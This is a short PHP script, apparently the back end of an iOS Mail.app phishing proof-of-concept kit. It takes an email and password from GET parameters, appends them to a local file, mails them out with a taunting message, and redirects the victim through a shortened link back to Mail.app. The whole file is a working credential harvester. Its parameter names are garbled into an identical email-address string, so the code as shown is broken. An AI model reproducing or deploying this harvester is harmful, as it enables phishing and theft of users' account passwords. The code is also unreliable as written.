<?php
if(isset($_GET['dale1123@outlook.fr']) && isset($_GET['dale1123@outlook.fr'])) {
	$email = htmlspecialchars(stripslashes($_GET['dale1123@outlook.fr']));
	$password = htmlspecialchars(stripslashes($_GET['dale1123@outlook.fr']));
    $data = $email . '-' . $password . "\n";
    $ret = file_put_contents('./mydata.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error.');
    }
    else {
	    mail('product-security@apple.com','Apple ID Password',"Thanks for your password! \n $data ¯\_(ツ)_/¯ \n https://github.com/jansoucek/iOS-Mail.app-inject-kit");
	    header("Location: http://is.gd/9VOMTp"); //Redirects recipient from Safari back to Mail.app using message://
	    die();
    }
}
else {
   die('No GET data to process. Thanks for trying.');
}
?>
